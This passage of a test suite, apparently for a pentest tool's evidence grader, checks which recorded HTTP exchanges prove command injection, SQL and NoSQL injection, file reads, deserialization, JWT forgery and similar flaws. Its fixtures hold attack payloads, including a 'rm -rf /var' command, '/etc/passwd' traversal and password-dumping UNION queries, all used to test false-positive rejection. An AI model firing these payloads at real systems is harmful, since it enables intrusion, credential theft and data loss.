"""The proof matrix: every class, in both directions.

The second direction is the one that matters. A gate that accepts real
evidence is easy; a gate that refuses a plausible-looking claim is the whole
point, and the case that proves it is a benign page that happens to contain
the right-looking string.
"""
import re
import itertools
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from argus import proof
from argus.session import Session


_TS = itertools.count(1_700_000_000.0, 0.25)


def ex(rid, url, body, status=200, headers=None, method="GET",
       req_headers=None, req_body=None, ts=None, elapsed_ms=None):
    """A recorded exchange, with a `ts` because a real one always has one.

    This helper built entries WITHOUT `ts`, which made it an unfaithful
    fixture for any requirement that orders evidence in time - and
    `verify_state_change` reads recorded time to tell the read before a
    write from the read after it. Entries get an increasing stamp in
    creation order, which is how a transcript is actually written; a test
    that needs a specific order passes `ts` explicitly.

    `elapsed_ms` is the same kind of omission one layer along, and it is
    deliberately NOT defaulted. A real exchange always carries one, and
    `verify_no_throttle` and `_window` both read it - but `_window` treats a
    missing or zero duration as a zero-width window that overlaps nothing,
    which is the fail-closed answer every existing race and ppoll fixture
    here relies on. Handing all of them a duration would quietly give close
    stamps intersecting windows and change what those tests assert. So a
    test that needs the duration passes it, the same way a test that needs a
    specific order passes `ts`, and the key is absent otherwise rather than
    present and wrong.
    """
    response = {"status": status,
                "headers": headers or {"content-type": "text/html"},
                "body": body}
    if elapsed_ms is not None:
        response["elapsed_ms"] = elapsed_ms
    return {"id": rid,
            "ts": next(_TS) if ts is None else ts,
            "request": {"method": method, "url": url,
                        "headers": req_headers or {"host": "t.local"},
                        "body": req_body},
            "response": response}


# The page that broke the old gate: no vulnerability of any kind, but it
# carries `uid=1`, a word, and a key-shaped string.
BENIGN = ex("r1", "http://t.local/x",
            "<html><body>Welcome to the shop. uid=1 selected.</body></html>")


def test_every_class_refuses_a_benign_page():
    for name in proof.classes():
        verdict = proof.grade(name, "Welcome", [BENIGN])
        assert verdict.grade in ("unproven", "refused"), \
            f"{name} graded {verdict.grade} on a page with no bug in it"


def test_every_class_names_its_requirement():
    for name in proof.classes():
        spec = proof.spec_for(name)
        assert spec.requirement, name
        if spec.verifier is not proof.verify_refused:
            assert spec.required, f"{name} has no required checks"
        for group in (spec.floor, spec.veto):
            for check in group:
                assert isinstance(check, str) and check, name


def test_scanner_output_is_not_class_evidence():
    event = {"id": "r9", "kind": "external_result",
             "output": "sqlmap identified the following injection point: id"}
    for name in proof.classes():
        if name == "dos":
            continue
        verdict = proof.grade(name, "injection point", [event])
        assert verdict.grade == "unproven"
        assert verdict.missing == ["proof read from the wire"]


def test_unknown_class_is_unproven_and_says_so():
    verdict = proof.grade("probably-bad", "Welcome", [BENIGN])
    assert verdict.grade == "unproven"
    assert "no requirement is defined" in verdict.checks[0]["detail"]


def test_scanner_label_hint():
    verdict = proof.grade("nuclei-match", "Welcome", [BENIGN])
    assert "candidate class" in verdict.checks[0]["detail"]


# --- rce --------------------------------------------------------------------

RCE_PROOF = ex("r2", "http://t.local/ping?host=127.0.0.1;%20id;%20echo%20argusk3m9",
               "PING ok\nuid=33(www-data) gid=33(www-data)\nargusk3m9\n")


def test_rce_proven_by_identity_and_nonce():
    verdict = proof.grade("rce", "uid=33(www-data) gid=33(www-data)", [RCE_PROOF])
    assert verdict.grade == "proven", verdict.explain()


def test_rce_refuses_a_reflection():
    """The trap: a search page echoing the payload produces `uid=` in the
    response without executing anything."""
    refl = ex("r3", "http://t.local/search?q=uid%3D0(root)%20gid%3D0(root);%20id",
              "<html>Results for: uid=0(root) gid=0(root); id</html>")
    verdict = proof.grade("rce", "uid=0(root) gid=0(root)", [refl])
    assert verdict.grade == "unproven"
    assert "reflection" in " ".join(c["detail"] for c in verdict.checks)


def test_rce_veto_on_a_destructive_payload():
    bad = ex("r4", "http://t.local/ping?host=1;%20rm%20-rf%20/var;%20id;%20echo%20argusk3m9",
             "uid=0(root) gid=0(root)\nargusk3m9")
    verdict = proof.grade("rce", "uid=0(root) gid=0(root)", [bad])
    assert verdict.grade == "unproven"
    assert "proof command stayed benign" in verdict.missing


def test_rce_timing_only_is_not_proof():
    blind = ex("r5", "http://t.local/ping?host=127.0.0.1;%20sleep%204", "PING ok")
    assert proof.grade("rce", "PING ok", [blind]).grade == "unproven"


def test_deserialize_declares_a_gadget_not_a_shell_separator():
    """Sharing rce's "a benign command was sent" made deserialize unprovable:
    a serialized payload carries its command inside the gadget."""
    spec = proof.spec_for("deserialize")
    assert "a serialized payload was sent" in spec.required
    assert "a benign command was sent" not in spec.required
    gadget = ex("r40", "http://t.local/import", method="POST",
                req_body='data=!!python/object/apply:os.system '
                         '["id; echo argusk3m9"]',
                body="uid=33(www-data) gid=33(www-data)\nargusk3m9")
    assert proof.grade("deserialization", "uid=33(www-data) gid=33(www-data)",
                       [gadget]).grade == "proven"
    # the rce proof itself is NOT a deserialization proof: no gadget was sent,
    # and the gadget is the floor - a page that merely prints an identity line
    # must not grade this class at all
    assert proof.grade("deserialize", "uid=33(www-data) gid=33(www-data)",
                       [RCE_PROOF]).grade == "unproven"
    assert proof.spec_for("deserialize").floor == (
        "a serialized payload was sent",)


# --- sqli -------------------------------------------------------------------

SQLI_FP = ex("r6", "http://t.local/item?id=1%27",
             "sqlite3.OperationalError: unrecognized token", 500)
SQLI_DUMP = ex("r7", "http://t.local/item?id=1%27%20UNION%20SELECT%20"
                     "username,password%20FROM%20users%20LIMIT%205--%20-",
               "<ul><li>admin - s3cr3t</li><li>alice - pw</li></ul>")


def test_sqli_proven_by_fingerprint_plus_row():
    verdict = proof.grade("sqli", "admin - s3cr3t", [SQLI_FP, SQLI_DUMP])
    assert verdict.grade == "proven", verdict.explain()


def test_sqli_error_only_is_a_candidate():
    """This is the grade the checked-in sample session's F01 actually earns."""
    verdict = proof.grade("sqli", "sqlite3.OperationalError", [SQLI_FP])
    assert verdict.grade == "candidate"
    assert "the query named its target" in verdict.missing
    assert "rows returned, not an error message" in verdict.missing


def test_sqli_dump_without_a_fingerprint_is_a_candidate():
    verdict = proof.grade("sqli", "admin - s3cr3t", [SQLI_DUMP])
    assert verdict.grade == "candidate"
    assert verdict.missing == ["data store fingerprinted"]


def test_sqli_quoting_the_error_fails_the_row_check():
    verdict = proof.grade("sqli", "sqlite3.OperationalError", [SQLI_FP, SQLI_DUMP])
    assert "rows returned, not an error message" in verdict.missing


def test_nosqli_needs_no_fingerprint():
    """No @@version read is required - but a control IS, because a JSON API
    returning documents is doing its job. The operator has to have changed
    the answer."""
    dump = ex("r8", "http://t.local/api/login",
              '[{"user":"admin"}]', method="POST",
              req_body='{"username":{"$ne":null},"password":{"$ne":null}}')
    control = ex("r8b", "http://t.local/api/login",
                 '{"error":"invalid credentials"}', 401, method="POST",
                 req_body='{"username":"admin","password":"x"}')
    assert proof.grade("nosqli", '{"user":"admin"}',
                       [dump, control]).grade == "proven"
    # without the control it stops short, whatever the documents look like
    assert proof.grade("nosqli", '{"user":"admin"}', [dump]).grade != "proven"


def test_nosqli_refuses_a_page_that_only_echoed_the_operator():
    """Found by the decision controller re-grading its own transcript.

    `verify_data_extraction` asked the REQUEST whether the query named its
    target, which for a document store is the only place it could ask - a
    Mongo query has no FROM clause. But that check answers "a payload was
    sent", never "a store answered". So `{"$ne": null}` reflected into a
    search page's own "no results" line satisfied every check: the operator
    was in the request, the status was 200, and the body was not a DBMS
    error. nosqli graded `proven` against a page with no database behind it.

    The fix is response-side: a document shape has to come back. Both
    directions are asserted here, and the second one is the one that matters.
    """
    payload = '{"$ne": null}'
    echo = ex("r1", "http://t.local/search?q=" + payload,
              f'<html><p>No results for: {payload}</p></html>')
    verdict = proof.grade("nosqli", "No results for", [echo])
    assert verdict.grade != "proven", verdict.explain()
    assert "the operator changed what the store answered" in verdict.missing

    # and the real thing still passes: documents, with ids, from a login
    # bypass that returned records the caller should not reach - with the
    # control that shows the operator is what changed the answer
    rows = ('[{"_id":"6512ab9f3c1d4e0012ab34cd","user":"alice","role":"admin"},'
            '{"_id":"6512ab9f3c1d4e0012ab34ce","user":"bob","role":"user"}]')
    dump = ex("r2", "http://t.local/api/login", rows, method="POST",
              req_body='{"username":{"$ne":null},"password":{"$ne":null}}')
    control = ex("r2b", "http://t.local/api/login",
                 '{"error":"invalid credentials"}', 401, method="POST",
                 req_body='{"username":"admin","password":"x"}')
    assert proof.grade("nosqli", rows[:80], [dump, control]).grade == "proven"


def test_nosqli_refuses_a_document_shape_the_store_refused():
    rows = '[{"_id":"6512ab9f3c1d4e0012ab34cd","user":"alice"}]'
    refused = ex("r3", "http://t.local/api/login", rows, status=403,
                 method="POST", req_body='{"username":{"$ne":null}}')
    assert proof.grade("nosqli", rows[:40], [refused]).grade != "proven"


def test_a_json_api_returning_its_own_records_is_not_nosqli():
    # an endpoint that legitimately answers with documents, probed with an
    # operator that changed nothing, must not read as an injection
    rows = '[{"_id":"6512ab9f3c1d4e0012ab34cd","title":"public post"}]'
    normal = ex("r4", "http://t.local/api/posts", rows)
    assert proof.grade("nosqli", rows[:40], [normal]).grade != "proven"


def test_sqli_flags_an_oversized_dump():
    rows = "\n".join(f"<li>user{i} - pw{i}</li>" for i in range(40))
    big = ex("r9", "http://t.local/item?id=1%27%20UNION%20SELECT%20a,b%20FROM%20users",
             rows)
    verdict = proof.grade("sqli", rows, [SQLI_FP, big])
    assert any(c["check"] == "extraction stayed minimal" and not c["ok"]
               for c in verdict.checks)


# --- file read, template, differential --------------------------------------

def test_lfi_needs_a_sentinel_and_a_control():
    hit = ex("r10", "http://t.local/download?file=../../etc/passwd",
             "root:x:0:0:root:/root:/bin/bash\n")
    miss = ex("r11", "http://t.local/download?file=../../etc/nope",
              "not found")
    assert proof.grade("lfi", "root:x:0:0", [hit]).grade == "candidate"
    assert proof.grade("lfi", "root:x:0:0", [hit, miss]).grade == "proven"
    # the control alone: the parameter does take a path, which is the surface,
    # so it is a candidate - but no file came back
    v = proof.grade("lfi", "not found", [miss])
    assert v.grade == "candidate"
    assert "known-file sentinel observed" in v.missing
    # a page that merely QUOTES a passwd line is not a file read at all
    blog = ex("r41", "http://t.local/blog/lfi",
              "<pre>root:x:0:0:root:/root:/bin/bash</pre>")
    assert proof.grade("lfi", "root:x:0:0", [blog]).grade == "unproven"


def test_ssti_needs_two_operand_pairs():
    """One product can be a coincidence in the page: `{{2*2}}` plus "Showing 4
    results" graded proven. Two different pairs cannot both land by accident.
    """
    done = ex("r12", "http://t.local/hello?name=%7B%7B7*7%7D%7D", "Hello 49")
    second = ex("r14", "http://t.local/hello?name=%7B%7B3*5%7D%7D", "Hello 15")
    echo = ex("r13", "http://t.local/hello?name=%7B%7B7*7%7D%7D", "Hello {{7*7}}")
    assert proof.grade("ssti", "Hello 49", [done]).grade == "candidate"
    assert proof.grade("ssti", "Hello 49", [done, second]).grade == "proven"
    assert proof.grade("ssti", "Hello {{7*7}}", [echo]).grade == "unproven"
    # the coincidence the audit demonstrated
    coincide = ex("r15", "http://t.local/p?name=%7B%7B2*2%7D%7D",
                  "<html>Showing 4 results</html>")
    assert proof.grade("ssti", "Showing 4 results", [coincide]).grade == "candidate"


def test_idor_needs_two_subjects_and_a_difference():
    mine = ex("r14", "http://t.local/api/user/1", '{"id":1,"username":"me"}')
    theirs = ex("r15", "http://t.local/api/user/2", '{"id":2,"username":"admin"}')
    # one unauthenticated request returning a user record IS a real signal -
    # what it is missing is the second id on the same endpoint
    one = proof.grade("idor", '"username":"admin"', [theirs])
    assert one.grade == "candidate"
    assert "two distinct object references on one endpoint" in one.missing
    assert proof.grade("idor", '"username":"admin"',
                       [mine, theirs]).grade == "proven"
    # the boilerplate case: the quoted bytes are in both responses, so the
    # difference is the page and not the identity - the floor check fails and
    # nothing above unproven is available
    assert proof.grade("idor", '"username"', [mine, theirs]).grade == "unproven"


FORGE_EVENT = {"id": "e1", "kind": "jwt_forge",
               "claims_set": {"role": "admin"},
               "token_sha256_16": {"resigned": "0123456789abcdef"}}


def test_jwt_needs_the_mint_and_the_rejected_control():
    """A good credential accepted and a bad one refused is an authorisation
    system working. What separates it from a forgery is that this system
    minted the accepted credential, which `jwt_forge` now records."""
    forged = ex("r16", "http://t.local/api/me", '{"role":"admin"}', 200,
                req_headers={"authorization": "Bearer forged"})
    bad = ex("r17", "http://t.local/api/me", "invalid signature", 401,
             req_headers={"authorization": "Bearer wrong"})
    # no mint on record: this is indistinguishable from a working auth check
    assert proof.grade("jwt", '{"role":"admin"}', [forged, bad]).grade == "unproven"
    v = proof.grade("jwt", '{"role":"admin"}', [forged, bad, FORGE_EVENT])
    assert v.grade == "proven", v.explain()
    # the mint alone, with no control, is a candidate
    assert proof.grade("jwt", '{"role":"admin"}',
                       [forged, FORGE_EVENT]).grade == "candidate"


def test_jwt_unproven_when_the_cited_request_carries_no_credential():
    """The sample session's F05 cites /api/user/1, which sends no token."""
    none = ex("r18", "http://t.local/api/user/1", '{"role": "admin"}')
    verdict = proof.grade("jwt", '"role": "admin"', [none])
    assert verdict.grade == "unproven"
    assert "a forged credential was accepted" in verdict.missing


def test_open_redirect_reads_the_location_header():
    off = ex("r19", "http://t.local/redirect?next=http://evil.test/",
             "", 302, headers={"location": "http://evil.test/"})
    home = ex("r20", "http://t.local/redirect?next=/home", "", 302,
              headers={"location": "/home"})
    assert proof.grade("redirect", "", [off]).grade == "candidate"
    assert proof.grade("open-redirect", "", [off, home]).grade == "proven"


def test_cache_poisoning_needs_both_halves():
    poison = ex("r21", "http://t.local/cached", "ok",
                req_headers={"x-forwarded-host": "evil.test"})
    victim = ex("r22", "http://t.local/cached",
                "<link href='http://evil.test/a.css'>")
    assert proof.grade("cache", "evil.test", [victim]).grade == "unproven"
    assert proof.grade("cache-poisoning", "evil.test",
                       [poison, victim]).grade == "proven"


def test_cors_requires_credentials_to_matter():
    reflect = ex("r23", "http://t.local/api/data", "{}", 200,
                 headers={"access-control-allow-origin": "http://evil.test"},
                 req_headers={"origin": "http://evil.test"})
    creds = ex("r24", "http://t.local/api/data", "{}", 200,
               headers={"access-control-allow-origin": "http://evil.test",
                        "access-control-allow-credentials": "true"},
               req_headers={"origin": "http://evil.test"})
    assert proof.grade("cors", "{}", [reflect]).grade == "candidate"
    assert proof.grade("cors", "{}", [creds]).grade == "proven"


def test_disclosure_wants_a_credential_shape():
    env = ex("r25", "http://t.local/.env", "SECRET_KEY=lab-secret-0123\n")
    assert proof.grade("info-disclosure", "SECRET_KEY=lab-secret-0123",
                       [env]).grade == "proven"
    assert proof.grade("disclosure", "lab", [env]).grade == "unproven"


def test_xss_cannot_exceed_candidate_without_a_browser():
    refl = ex("r26", "http://t.local/search?q=x%3C%3E%27%22",
              "<html><body>Results for: x<>'\"</body></html>", 200,
              headers={"content-type": "text/html; charset=utf-8"})
    verdict = proof.grade("xss", "x<>'\"", [refl])
    assert verdict.grade == "candidate"
    assert verdict.missing == ["a real browser executed it"]
    enc = ex("r27", "http://t.local/search?q=x%3C%3E",
             "<html><body>Results for: x&lt;&gt;</body></html>", 200,
             headers={"content-type": "text/html"})
    assert proof.grade("xss", "x&lt;&gt;", [enc]).grade == "unproven"


def test_dos_is_refused_outright():
    verdict = proof.grade("dos", "anything", [BENIGN])
    assert verdict.grade == "refused"
    assert "the proof is the damage" in verdict.checks[0]["detail"]


# --- the class vocabulary ---------------------------------------------------

@pytest.mark.parametrize("spelling", ["sqli", "SQLi", "sql-injection",
                                      "SQL Injection", "sqlinjection"])
def test_canonical_folds_spellings(spelling):
    assert proof.canonical(spelling) == "sqli"


def test_canonical_keeps_an_unknown_class_readable():
    assert proof.canonical("Weird Bug") == "weird-bug"


def test_requirement_lookup():
    assert "id; echo" in proof.requirement_of("command-injection")
    assert proof.requirement_of("not-a-class") == ""


def test_grade_never_raises_on_a_mangled_entry():
    for bad in ([{"id": "r1", "response": "not a dict"}],
                [{"id": "r1"}], [None], [], None):
        assert proof.grade("sqli", "x", bad).grade in ("unproven", "candidate")


# --- the recorder ------------------------------------------------------------

def _sess(tmp_path, **kw):
    return Session(tmp_path, "http://t.local", meta={}, **kw)


def test_finding_carries_its_grade(tmp_path):
    s = _sess(tmp_path)
    rid = s.record_exchange("probe_sqli",
                            {"method": "GET", "url": "http://t.local/item?id=1'"},
                            {"status": 500, "headers": {},
                             "body": "sqlite3.OperationalError: near"})
    f = s.add_finding("sqli", "high", "SQL Injection", "http://t.local/item?id=1",
                      [rid], "sqlite3.OperationalError", "d", "r")
    assert f["vuln_class"] == "sqli"
    assert f["grade"] == "candidate"
    assert "the query named its target" in f["proof"]["missing"]


def test_better_evidence_upgrades_in_place(tmp_path):
    s = _sess(tmp_path)
    r1 = s.record_exchange("probe_sqli",
                           {"method": "GET", "url": "http://t.local/item?id=1'"},
                           {"status": 500, "headers": {},
                            "body": "sqlite3.OperationalError: near"})
    s.add_finding("sqli", "high", "sqli", "http://t.local/item?id=1", [r1],
                  "sqlite3.OperationalError", "d", "r")
    r2 = s.record_exchange(
        "http_request",
        {"method": "GET", "url": "http://t.local/item?id=1' UNION SELECT "
                                 "username,password FROM users LIMIT 5-- -"},
        {"status": 200, "headers": {}, "body": "<li>admin - s3cr3t</li>"})
    f = s.add_finding("sqli", "critical", "sqli", "http://t.local/item?id=1",
                      [r1, r2], "admin - s3cr3t", "dumped", "bind params")
    assert f["id"] == "F01" and f["grade"] == "proven"
    assert f["upgraded_from"] == "candidate"
    assert f["severity"] == "critical"
    assert len(s.findings) == 1
    # the same or weaker evidence is still a duplicate
    with pytest.raises(ValueError, match="duplicate of F01"):
        s.add_finding("again", "high", "sql-injection", "http://t.local/item?id=1",
                      [r1], "sqlite3.OperationalError", "d", "r")


def test_dedup_folds_class_spellings(tmp_path):
    """Two workers naming one bug differently recorded it twice."""
    s = _sess(tmp_path)
    rid = s.record_exchange("t", {"method": "GET", "url": "http://t.local/i"},
                            {"status": 200, "headers": {}, "body": "proof"})
    s.add_finding("a", "high", "sqli", "http://t.local/i?id=1", [rid],
                  "proof", "d", "r")
    with pytest.raises(ValueError, match="duplicate"):
        s.add_finding("b", "high", "SQL-Injection", "http://t.local/i?id=1",
                      [rid], "proof", "d", "r")


def test_require_proof_refuses_a_candidate(tmp_path):
    s = _sess(tmp_path, require_proof=True)
    rid = s.record_exchange("probe_sqli",
                            {"method": "GET", "url": "http://t.local/item?id=1'"},
                            {"status": 500, "headers": {},
                             "body": "sqlite3.OperationalError: near"})
    with pytest.raises(ValueError, match="require-proof"):
        s.add_finding("sqli", "high", "sqli", "http://t.local/item?id=1", [rid],
                      "sqlite3.OperationalError", "d", "r")
    assert s.findings == []


def test_require_proof_accepts_what_is_proven(tmp_path):
    s = _sess(tmp_path, require_proof=True)
    r1 = s.record_exchange("probe_sqli",
                           {"method": "GET", "url": "http://t.local/item?id=1'"},
                           {"status": 500, "headers": {},
                            "body": "sqlite3.OperationalError: near"})
    r2 = s.record_exchange(
        "http_request",
        {"method": "GET", "url": "http://t.local/item?id=1' UNION SELECT a,b "
                                 "FROM users LIMIT 5-- -"},
        {"status": 200, "headers": {}, "body": "<li>admin - s3cr3t</li>"})
    f = s.add_finding("sqli", "critical", "sqli", "http://t.local/item?id=1",
                      [r1, r2], "admin - s3cr3t", "d", "r")
    assert f["grade"] == "proven"


# --- the classes a wrong requirement made unprovable ------------------------

def test_header_acl_bypass_is_graded_as_access_control_not_caching():
    """xfh and host-header used to be aliased onto the cache-poisoning spec,
    so the lab's own `X-Original-URL: /admin` bypass graded unproven under a
    requirement about caches."""
    denied = ex("r30", "http://t.local/admin", "Forbidden", 403)
    served = ex("r31", "http://t.local/admin",
                "<h1>Admin panel</h1> user list", 200,
                req_headers={"x-original-url": "/admin"})
    assert proof.canonical("xfh") == "xfh"
    assert proof.grade("xfh", "<h1>Admin panel</h1>",
                       [denied, served]).grade == "proven"
    # the bypass alone is a candidate: nothing shows the resource was restricted
    assert proof.grade("host-header", "<h1>Admin panel</h1>",
                       [served]).grade == "candidate"
    # a control on a different path does not prove THIS path was restricted
    elsewhere = ex("r32", "http://t.local/other", "<h1>Admin panel</h1>", 200,
                   req_headers={"x-original-url": "/admin"})
    assert proof.grade("xfh", "<h1>Admin panel</h1>",
                       [denied, elsewhere]).grade == "candidate"
    assert proof.grade("xfh", "Welcome", [BENIGN]).grade == "unproven"


def test_each_mechanism_has_its_own_class():
    """Aliasing distinct mechanisms onto one class makes them share a dedup
    key, so the second genuine finding on an endpoint is refused as a
    duplicate of the first. Smuggling is not cache poisoning - different
    mechanism, different CWE - and an ACL bypass is neither."""
    assert proof.canonical("cache-poisoning") == "cache"
    assert proof.canonical("web-cache-deception") == "cache"
    assert proof.canonical("request-smuggling") == "smuggle"
    assert proof.canonical("x-original-url") == "xfh"
    assert proof.canonical("mass-assignment") == "massassign"
    assert proof.canonical("prototype-pollution") == "ppoll"
    assert proof.canonical("race-condition") == "race"
    from argus.session import _cwe_of
    assert _cwe_of("cache") != _cwe_of("smuggle")
    assert _cwe_of("xfh") != _cwe_of("smuggle")


# --- a refused class is not a finding ---------------------------------------

def test_a_refused_class_cannot_be_recorded(tmp_path):
    """The matrix does not say the dos evidence is thin, it says the system
    does not prove the class. Keeping a `critical` dos finding on file was the
    assertion-instead-of-proof the gate exists to stop."""
    s = _sess(tmp_path)
    rid = s.record_exchange("t", {"method": "GET", "url": "http://t.local/x"},
                            {"status": 200, "headers": {}, "body": "slow"})
    with pytest.raises(ValueError, match="refused class"):
        s.add_finding("thread exhaustion", "critical", "dos",
                      "http://t.local/x", [rid], "slow", "d", "r")
    with pytest.raises(ValueError, match="refused class"):
        s.add_finding("slowloris", "high", "resource-exhaustion",
                      "http://t.local/x", [rid], "slow", "d", "r")
    assert s.findings == []


# --- identifiers -------------------------------------------------------------

def test_every_class_maps_to_a_cwe():
    from argus.session import _cwe_of
    unmapped = [c for c in proof.classes() if not _cwe_of(c)]
    assert unmapped == [], f"no CWE for {unmapped}"


def test_rce_carries_cwe_and_owasp(tmp_path):
    """The headline acceptance class was the one with no identifiers."""
    from argus.session import _cwe_of, _owasp_of
    assert _cwe_of("rce") == "CWE-78"
    assert _owasp_of("CWE-78")
    s = _sess(tmp_path)
    rid = s.record_exchange(
        "probe_cmdi",
        {"method": "GET",
         "url": "http://t.local/ping?host=127.0.0.1;%20id;%20echo%20argusk3m9"},
        {"status": 200, "headers": {},
         "body": "uid=33(www-data) gid=33(www-data)\nargusk3m9"})
    f = s.add_finding("cmdi", "critical", "command-injection",
                      "http://t.local/ping", [rid],
                      "uid=33(www-data) gid=33(www-data)", "d", "r")
    assert f["grade"] == "proven"
    assert f["cwe"] == "CWE-78" and f["owasp"]


def test_xfh_no_longer_claims_the_smuggling_cwe():
    from argus.session import _cwe_of
    assert _cwe_of("xfh") == "CWE-290"
    assert _cwe_of("smuggle") == "CWE-444"


# --- tamper-evidence over the grade -----------------------------------------

def test_verify_detects_an_inflated_grade(tmp_path):
    """findings.json is operator-editable. Raising a stored grade makes the
    claim stronger with no new evidence; the grade is recomputed from the
    chained transcript, so the claim has to hold against it."""
    from argus.session import findings_overgraded
    s = _sess(tmp_path)
    rid = s.record_exchange("probe_sqli",
                            {"method": "GET", "url": "http://t.local/item?id=1'"},
                            {"status": 500, "headers": {},
                             "body": "sqlite3.OperationalError: near"})
    f = s.add_finding("sqli", "high", "sqli", "http://t.local/item?id=1",
                      [rid], "sqlite3.OperationalError", "d", "r")
    assert f["grade"] == "candidate"
    entries = {rid: s.get_exchange(rid)}
    assert findings_overgraded(entries, s.findings) == []
    inflated = [{**f, "grade": "proven"}]
    rows = findings_overgraded(entries, inflated)
    assert rows and rows[0]["claimed"] == "proven"
    assert rows[0]["evidence_supports"] == "candidate"
    assert rows[0]["missing"]


def test_a_weaker_stored_grade_is_not_a_tamper_signal(tmp_path):
    """A requirement loosening later must not retroactively condemn a session."""
    from argus.session import findings_overgraded
    s = _sess(tmp_path)
    rid = s.record_exchange(
        "probe_cmdi",
        {"method": "GET",
         "url": "http://t.local/ping?host=1;%20id;%20echo%20argusk3m9"},
        {"status": 200, "headers": {},
         "body": "uid=0(root) gid=0(root)\nargusk3m9"})
    f = s.add_finding("rce", "critical", "rce", "http://t.local/ping", [rid],
                      "uid=0(root) gid=0(root)", "d", "r")
    assert f["grade"] == "proven"
    understated = [{**f, "grade": "candidate"}]
    assert findings_overgraded({rid: s.get_exchange(rid)}, understated) == []


def test_legacy_findings_without_a_grade_are_skipped():
    from argus.session import findings_overgraded
    assert findings_overgraded({}, [{"id": "F01", "severity": "high"}]) == []
    assert findings_overgraded({}, ["not a dict", None]) == []


# --- the renderers tell the same story --------------------------------------

def test_sanitized_findings_survives_a_hand_edited_proof_block():
    from argus.session import sanitized_findings
    rows = sanitized_findings([
        {"id": "F01", "severity": "high", "grade": 123, "proof": "not a dict"},
        {"id": "F02", "proof": {"checks": "nope", "missing": 5,
                                "requirement": None}},
    ])
    assert rows[0]["proof"] == {}
    assert rows[0]["grade"] == "123"
    assert rows[1]["proof"]["checks"] == [] and rows[1]["proof"]["missing"] == []

def test_no_spec_declares_a_check_its_verifier_never_emits():
    """A renamed check leaves the spec pointing at a name nothing produces.
    The grade then depends on a check that can never pass, so the class is
    silently unprovable - which is how `cors` lost its floor during a rename
    and graded every claim unproven.
    """
    rich = [
        ex("w1", "http://t.local/x?file=../../etc/passwd",
           "root:x:0:0:root:/root:/bin/bash"),
        ex("w2", "http://t.local/admin", "Forbidden", 403),
        ex("w3", "http://t.local/p?n=%7B%7B7*7%7D%7D", "49"),
        ex("w4", "http://t.local/api/me", '{"role":"admin","username":"a"}',
           200, req_headers={"host": "t.local", "authorization": "Bearer x",
                             "origin": "http://evil.test"}),
        ex("w5", "http://t.local/go", "", 302,
           headers={"location": "http://evil.test/"}),
        ex("w6", "http://t.local/w", "ok", 200, method="POST",
           req_body="role=admin"),
    ]
    orphans = {}
    for name in proof.classes():
        spec = proof.spec_for(name)
        if spec.verifier is proof.verify_refused:
            continue
        produced = set()
        for subset in ([], rich, rich[:1], rich[:2]):
            checks = spec.verifier(proof.Claim("root:x:0:0", subset), spec)
            produced |= {c["check"] for c in checks}
        declared = (set(spec.required) | set(spec.veto) | set(spec.floor)
                    | set(spec.advisories))
        missing = sorted(declared - produced)
        if missing:
            orphans[name] = missing
    assert not orphans, f"specs declare checks nothing emits: {orphans}"


def test_every_class_states_what_it_cannot_settle():
    """A class capped at `candidate` must say so in its requirement, because
    the cap is the honest answer and a reader has to be able to see it."""
    for name in proof.classes():
        spec = proof.spec_for(name)
        if spec.ceiling != "candidate":
            continue
        text = (spec.requirement + " " + spec.notes).lower()
        assert any(w in text for w in ("candidate", "browser", "collector",
                                       "this system", "stops at", "measures",
                                       "needs a")), \
            f"{name} is capped at candidate without saying why: {spec.requirement}"


# --- the bypasses an adversarial audit demonstrated, kept closed -----------
#
# Every case below graded `proven` once, on evidence containing no
# vulnerability at all. They are the regression net for the structural fix:
# a check that scans the whole cited set independently is not a proof, because
# the conjunction can be satisfied by combining unrelated exchanges.

def test_rce_cannot_be_assembled_from_two_exchanges():
    """Cite a request that sent `id` and got nothing, plus an unrelated debug
    page that prints an identity line. Each check passed somewhere; nothing
    was executed anywhere."""
    sent = ex("b1", "http://t.local/ping?host=aaaaaa;%20id",
              "<html>PING aaaaaa: 4 packets</html>")
    elsewhere = ex("b2", "http://t.local/debug",
                   "<html><pre>uid=33(www-data) gid=33(www-data)</pre></html>")
    v = proof.grade("rce", "uid=33(www-data) gid=33(www-data)",
                    [sent, elsewhere])
    assert v.grade == "unproven", v.explain()
    assert "identity output returned by the target" in v.missing


def test_rce_nonce_must_be_the_one_this_system_sends():
    """"any 6-32 char token present in both the request and the response" made
    every page that echoes a parameter carry a valid nonce."""
    echo = ex("b3", "http://t.local/ping?host=aaaaaa;%20id",
              "PING aaaaaa\nuid=0(root) gid=0(root)\n")
    v = proof.grade("rce", "uid=0(root) gid=0(root)", [echo])
    assert "the probe nonce came back in the output" in v.missing
    real = ex("b4", "http://t.local/ping?host=1;%20id;%20echo%20argus7k2m9x",
              "uid=0(root) gid=0(root)\nargus7k2m9x\n")
    assert proof.grade("rce", "uid=0(root) gid=0(root)", [real]).grade == "proven"


def test_sqli_not_proven_by_the_english_word_from():
    """req_text unquote_plus-es the request, so `?q=mail+from+bob` became
    "mail from bob" and named the table `bob`. An ordinary search box satisfied
    "the query named its target", and a page mentioning a database satisfied
    the fingerprint."""
    page = ex("b5", "http://t.local/search?q=mail+from+bob",
              "<html>We moved to PostgreSQL in 2019. "
              "Results: <li>alice - note</li></html>")
    v = proof.grade("sqli", "alice - note", [page])
    assert v.grade == "candidate", v.explain()
    assert "the query named its target" in v.missing
    for benign in ("GET /flights?from=london&to=paris",
                   'POST /t {"from":"alice","to":"bob"}',
                   "GET /p?ref=news+from+paris"):
        assert not proof.TABLE_RE.search(
            __import__("urllib.parse", fromlist=["parse"]).unquote_plus(benign)), benign


def test_difference_only_classes_cannot_reach_proven():
    """verify_generic is `_discriminates` alone - true of any two pages on any
    site - and it graded seven classes proven."""
    a = ex("b6", "http://t.local/a", "<html>Page A unique</html>")
    b = ex("b7", "http://t.local/b", "<html>Page B different</html>")
    # lockout left this set: its artifact is the ABSENCE of a difference, and
    # being graded by `_discriminates` inverted it
    # enum left this set too: the series its probe sends IS in the transcript,
    # so "one difference is not a counted series" was a missing implementation
    # described as a limit
    # crlf left it as well: the artifact is a response HEADER, and the
    # transcript records headers as a dict - so "this system compares bodies"
    # described the verifier, not the evidence. Two different pages now grade
    # `unproven` for crlf rather than `candidate`, which is the point: there
    # is no header in evidence to have been injected.
    # websocket left it as well, and it was the one genuinely blocked on a
    # missing client rather than a missing verifier: `GuardedClient.send_ws`
    # frames now, so the handshake AND the answered message are both on
    # record and both checkable.
    # ssrf is the only one left on `verify_generic`, and its cap is the
